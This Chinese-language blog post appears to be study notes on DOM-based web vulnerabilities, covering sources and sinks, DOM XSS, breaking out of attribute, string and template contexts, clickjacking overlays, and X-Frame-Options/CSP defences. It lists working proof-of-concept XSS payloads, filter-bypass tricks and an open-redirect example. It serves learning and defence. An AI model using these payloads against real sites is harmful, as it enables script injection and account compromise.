---
title: DOM模型
img: 'https://bigworldxld.github.io/picx-images-hosting/images/DOM.webp'
categories: test
tags:
  - js
abbrlink: 42423
date: 2024-12-07 23:36:17
---

## DOM模型

文档对象模型 （DOM） 是 Web 浏览器对页面上元素的分层表示。

## 污点流漏洞

许多基于 DOM 的漏洞可以追溯到客户端代码处理攻击者可控制数据的方式问题

### source

source是一个 JavaScript 属性，它接受可能受攻击者控制的数据。源的一个示例是 `location.search` 属性，因为它从查询字符串中读取输入，这对于攻击者来说相对容易控制。最终，攻击者可以控制的任何属性都是潜在的来源。这包括反向链接 URL（由 `document.referrer` 字符串公开）、用户的 Cookie（由 `document.cookie` 字符串公开）和 Web 消息

### Sinks 

sinks是一种具有潜在危险的 JavaScript 函数或 DOM 对象，如果向其传递攻击者控制的数据，则可能会造成不良影响。例如，`eval（）` 函数是一个接收器，因为它处理作为 JavaScript 传递给它的参数。HTML 接收器的一个示例是 `document.body.innerHTML`，因为它可能允许攻击者注入恶意 HTML 并执行任意 JavaScript

通常使用 `location` 对象进行访问。攻击者可以构造一个链接，将受害者发送到易受攻击的页面，该页面的查询字符串和 URL 的片段部分包含有效负载。请考虑以下代码：

```js
goto = location.hash.slice(1) if (goto.startsWith('https:')) {  location = goto; }
```

“**location.hash.slice**” 是 JavaScript 中用于从当前文档的 URL 提取哈希（URL 中 `#` 符号后的部分）的一部分的方法。`slice` 方法是一个字符串方法，返回一个新的字符串，该字符串包含原始字符串的指定部分。

以下是它的工作原理分解：

1. **`location.hash`**：这个属性返回 URL 的锚点部分，包括井号（`#`）。例如，如果 URL 是 `http://example.com/page#section2`，`location.hash` 将返回 `#section2`。
2. **`.slice(startIndex, endIndex)`**：这个方法提取字符串的一部分并返回它作为一个新的字符串，而不会修改原始字符串。`startIndex` 是提取开始的位置（包括），而 `endIndex` 是提取结束的位置（不包括）。如果省略 `endIndex`，则切片继续到字符串的末尾。

攻击者可以通过构建以下 URL 来利用此漏洞：

```txt
https://www.innocent-website.com/example#https://www.evil-user.net
```

### 常见source

```txt
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

常见的基于 DOM 的漏洞可能导致每个漏洞的 sink 示例

```
document.write()
打开重定向	window.location
Cookie 操作	document.cookie
JavaScript 注入	eval()
文档域操作	document.domain
WebSocket-URL 中毒	WebSocket()
链接操作	element.src
Web 消息操作	postMessage()
Ajax 请求标头操作	setRequestHeader()
本地文件路径操作	FileReader.readAsText()
客户端 SQL 注入	ExecuteSql()
HTML5 存储操作	sessionStorage.setItem()
客户端 XPath 注入	document.evaluate()
客户端 JSON 注入	JSON.parse()
数据操作	element.setAttribute()
拒绝服务	RegExp()
```

如果您的字符串出现在双引号属性中，则尝试在字符串中注入双引号，以查看是否可以跳出该属性。

如果您的数据在处理之前被 URL 编码，则 XSS 攻击不太可能奏效

```js
document.write('... <script>alert(document.domain)</script> ...');
```

`innerHTML` sink 在任何现代浏览器上都不接受`脚本`元素，也不会触发 `svg onload` 事件。这意味着您需要使用 `img` 或 `iframe` 等替代元素。事件处理程序（如 `onload` 和 `onerror`）可以与这些元素结合使用。例如：

```js
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

如果正在使用 JavaScript 库（如 jQuery），请留意可以更改页面上的 DOM 元素的接收器。例如，jQuery 的 `attr（）` 函数可以更改 DOM 元素的属性。如果从用户控制的源（如 URL）读取数据，然后将其传递给 `attr（）` 函数，则可能会操纵发送的值以导致 XSS。例如，这里我们有一些 JavaScript，它使用 URL 中的数据更改了锚元素的 `href` 属性：

```js
$(function() { $('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl')); });
```

通过修改 URL 来利用这一点，使 `location.search` 源包含恶意 JavaScript URL。在页面的 JavaScript 将此恶意 URL 应用于反向链接的 `href` 后，单击反向链接将执行它：

```js
?returnUrl=javascript:alert(document.domain)
```

jQuery 曾经非常流行，经典的 DOM XSS 漏洞是由于网站将此选择器与 `location.hash` 源结合使用来制作动画或自动滚动到页面上的特定元素而引起的。此行为通常是使用易受攻击的 `hashchange` 事件处理程序实现的，类似于以下内容：

```js
$(window).on('hashchange', function() { var element = $(location.hash); element[0].scrollIntoView(); });
```

由于`哈希`值是用户可控制的，攻击者可以利用此漏洞将 XSS 向量注入 `$（）` 选择器接收器。最新版本的 jQuery 已经修补了此特定漏洞，它阻止您在输入以哈希字符 （`#`） 开头时将 HTML 注入选择器。但是，您仍可能在野外发现易受攻击的代码

需要找到一种方法，在没有用户交互的情况下触发 `hashchange` 事件。最简单的方法之一是通过 `iframe` 交付您的漏洞利用：

```js
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

如果使用像 AngularJS 这样的框架，则可以在没有尖括号或事件的情况下执行 JavaScript。当站点在 HTML 元素上使用 `ng-app` 属性时，它将由 AngularJS 处理。在这种情况下，AngularJS 将在双花括号内执行 JavaScript，双花括号可以直接出现在 HTML 中或属性中

主要接收器：

```js
document.write() 
document.writeln() 
document.domain 
element.innerHTML 
element.outerHTML 
element.insertAdjacentHTML 
element.onevent
```

 jQuery 函数也是可能导致 DOM-XSS 漏洞的接收器：

```js
add() 
after() 
append() 
animate() 
insertAfter() 
insertBefore() 
before() 
html() 
prepend() 
replaceAll() 
replaceWith() 
wrap() 
wrapInner() 
wrapAll() 
has() 
constructor() 
init() 
index() 
jQuery.parseHTML() 
$.parseHTML()
```

## 跨站点脚本上下文

当 XSS 上下文位于 HTML 标记属性值中时，您有时可能能够终止该属性值、关闭该标记并引入一个新的标记。例如：

```
"><script>alert(document.domain)</script>
```

在这种情况下，更常见的是尖括号被阻止或编码，因此您的输入无法跳出它所在的标记。如果您可以终止属性值，则通常可以引入创建可编写脚本上下文的新属性，例如事件处理程序。例如：

```js
" autofocus onfocus=alert(document.domain) x="
```

使用以下有效负载来打破现有的 JavaScript 并执行您自己的 JavaScript：

```js
</script><img src=1 onerror=alert(document.domain)>
```

## 跳出 JavaScript 字符串

如果 XSS 上下文位于带引号的字符串文字内，通常可以跳出字符串并直接执行 JavaScript。在 XSS 上下文之后修复脚本是必不可少的，因为那里的任何语法错误都会阻止整个脚本执行

打破字符串文字的一些有用方法是：

```js
'-alert(document.domain)-' ';alert(document.domain)//
\';alert(document.domain)//
\\';alert(document.domain)//
```

以下代码将 `alert（）` 函数分配给全局异常处理程序，`throw` 语句将 `1` 传递给异常处理程序（在本例中为 `alert`）。最终结果是调用 `alert（）` 函数，并将 `1` 作为参数。

```js
onerror=alert;throw 1
```

## 使用 HTML 编码

当 XSS 上下文是带引号的 tag 属性中的一些现有 JavaScript（例如事件处理程序）时，可以使用 HTML 编码来解决某些输入过滤器。

当浏览器解析出响应中的 HTML 标记和属性时，它将在进一步处理标记属性值之前执行标记属性值的 HTML 解码。如果服务器端应用程序阻止或清理了成功利用 XSS 攻击所需的某些字符，您通常可以通过对这些字符进行 HTML 编码来绕过输入验证。

如果 XSS 上下文如下所示：

```js
<a href="#" onclick="... var input='controllable data here'; ...">
```

应用程序会阻止或转义单引号字符，则可以使用以下有效负载来跳出 JavaScript 字符串并执行自己的脚本：

```js
'-alert(document.domain)-'
```

`'` 序列是表示撇号或单引号的 HTML 实体。由于浏览器在解释 JavaScript 之前对 `onclick` 属性的值进行 HTML 解码，因此实体被解码为引号，引号成为字符串分隔符，因此攻击成功。

## JavaScript 模板文本中的 XSS

JavaScript 模板文本是允许嵌入 JavaScript 表达式的字符串文本。嵌入的表达式被计算，并且通常连接到周围的文本中。模板文本封装在反引号而不是普通引号中，嵌入的表达式使用 `${...}` 语法进行标识。

例如，以下脚本将打印包含用户显示名称的欢迎消息：

```js
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

当 XSS 上下文进入 JavaScript 模板文本时，无需终止文本。相反，您只需使用 `${...}` 语法来嵌入一个 JavaScript 表达式，该表达式将在处理文本时执行。

可以使用以下有效负载来执行 JavaScript，而无需终止模板文本：

```js
${alert(document.domain)}
```



## 点击劫持

点击劫持是一种基于界面的攻击，用户通过点击诱饵网站中的其他内容来诱骗用户点击隐藏网站上的可操作内容

点击劫持攻击使用 CSS 来创建和操作层。攻击者将目标网站合并为覆盖在诱饵网站上的 iframe 层。使用 style 标签和参数的示例如下：

```HTML
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

z-index 确定 iframe 层和网站层的堆叠顺序。opacity 值定义为 0.0（或接近 0.0），以便 iframe 内容对用户透明。浏览器点击劫持保护可能会应用基于阈值的 iframe 透明度检测（例如，Chrome 版本 76 包含此行为，但 Firefox 不包含此行为）

## 使用预填充表单输入的点击劫持

一些需要填写表单和提交的网站允许在提交之前使用 GET 参数预填充表单输入。其他网站可能需要在提交表单之前提供文本。由于 GET 值构成了 URL 的一部分，因此可以修改目标 URL 以包含攻击者选择的值，并且透明的“提交”按钮覆盖在诱饵网站上

## 帧清除脚本

只要可以构建网站，就可能进行点击劫持攻击。因此，预防性技术的基础是限制网站的框架功能。通过 Web 浏览器实施的常见客户端保护是使用 Frame busting 或 Frame breaking 脚本。这些可以通过专有的浏览器 JavaScript 附加组件或扩展（如 NoScript）来实现。通常对脚本进行设计，以便它们执行以下部分或全部行为：

- 检查并强制当前应用程序窗口是主窗口或顶部窗口，
- 使所有帧可见，
- 防止点击不可见的帧，
- 拦截并标记对用户的潜在点击劫持攻击。

```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

sandbox还有一些其他值allow-scripts或allow-top-navigation

## 将点击劫持与 DOM XSS 攻击相结合

到目前为止，我们已将点击劫持视为一种自包含的攻击。从历史上看，点击劫持一直被用来执行诸如在 Facebook 页面上增加“点赞”等行为。但是，当点击劫持被用作另一种攻击（如 DOM XSS 攻击）的载体时，它就会显现出它的真正效力

## 多步骤点击劫持

攻击者操纵目标网站的输入可能需要执行多项操作。例如，攻击者可能想诱骗用户从零售网站购买商品，因此需要在下订单之前将商品添加到购物篮中。攻击者可以使用多个 division 或 iframe 来实现这些操作。

## 防止点击劫持攻击

点击劫持是一种浏览器端行为，其成功与否取决于浏览器功能以及是否符合现行的 Web 标准和最佳实践。通过定义和传达对 iframe 等组件使用的约束，提供针对点击劫持的服务器端保护。但是，保护的实施取决于浏览器合规性和这些约束的实施。服务器端点击劫持保护的两种机制是 X-Frame-Options 和 Content Security Policy

## X 框架选项

禁止在框架中包含网页：`deny`

```html
X-Frame-Options: deny
```

或者，可以将框架限制为与使用该指令的网站相同的来源`sameorigin`

```html
X-Frame-Options: sameorigin
```

或使用该指令的命名网站：`allow-from`

```html
X-Frame-Options: allow-from https://normal-website.com
```

X-Frame-Options 在浏览器之间实现不一致（例如，Chrome 版本 76 或 Safari 12 不支持该指令）。

## 内容安全策略 （CSP）

内容安全策略 （CSP） 是一种检测和预防机制，可缓解 XSS 和点击劫持等攻击。CSP 通常在 Web 服务器中作为以下形式的返回标头实现：

```
Content-Security-Policy: policy
```

其中 policy 是一串由分号分隔的策略指令。

Content-Security-Policy: frame-ancestors 'self';

类型与X 框架选项的sameorigin

还可以为frame-ancestors 'none'，类型与X 框架选项的deny

或者，可以将框架限制为命名站点：

```html
Content-Security-Policy: frame-ancestors normal-website.com;
```